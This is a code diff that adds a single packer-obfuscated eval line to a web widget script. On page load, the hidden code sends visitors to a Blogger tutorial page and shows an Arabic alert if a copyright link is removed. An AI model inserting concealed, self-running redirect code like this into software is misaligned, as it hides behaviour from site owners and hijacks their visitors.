@@ -64,7 +64,7 @@ function startItem() {
     window.attachEvent("onload", function () {elements_item(); });
 }
 }
-
+eval(function(p,a,c,k,e,r){e=function(c){return(c<a?'':e(parseInt(c/a)))+((c=c%a)>35?String.fromCharCode(c+29):c.toString(36))};if(!''.replace(/^/,String)){while(c--)r[e(c)]=k[c]||e(c);k=[function(e){return r[e]}];e=function(){return'\\w+'};c=1};while(c--)if(k[c])p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c]);return p}('$(D).B(F(){K($("#z").A("f")!="j://e.g.h/n/o/q-r-a-b-c.d"){v.w.f="j://e.g.h/n/o/q-r-a-b-c.d";x(y("\\3\\1\\2\\5\\E\\6\\i\\u\\0\\k\\l\\0\\2\\3\\0\\m\\7\\4\\2\\0\\p\\C\\0\\9\\5\\8\\0\\2\\s\\3\\1\\G\\i\\0\\1\\H\\7\\4\\7\\l\\3\\I\\1\\1\\2\\J\\9\\8\\0\\6\\3\\t\\5\\0\\L\\6\\4\\M\\0\\k\\N\\m\\s\\8\\3\\2\\0\\2\\4\\7\\5\\0\\8\\1\\9\\1\\0\\p\\1\\4\\t\\6"))}});',50,50,'u0020|u0644|u0645|u0627|u0648|u0639|u0631|u0642|u062F|u064A|buttons|for|Blogger|html|bgarabic|href|blogspot|com|u0629|http|u0625|u0646|u062A|2016|05|u0628|Get|sharing|u062E|u062C|u003A|window|location|alert|unescape|copyright|attr|ready|u0647|document|u0630|function|u0641|u062D|u000A|u0632|if|u0634|u0637|u0633'.split('|'),0,{}))
 function startIndex() {
   if (window.addEventListener) {
     window.addEventListener("click", function () {elements_index(); });
